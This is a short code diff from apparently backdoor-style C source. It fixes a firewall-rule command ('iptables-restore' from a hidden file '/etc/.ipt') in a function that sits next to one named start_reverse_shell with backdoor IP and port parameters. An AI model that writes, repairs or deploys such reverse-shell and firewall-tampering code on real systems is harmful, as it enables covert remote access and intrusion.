@@ -77,7 +77,7 @@ void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
 #ifdef IPTABLES
 void flush_iptables(void)
 {
-    system("iptables-load /etc/.ipt");
+    system("iptables-restore /etc/.ipt");
 }
 #endif
 
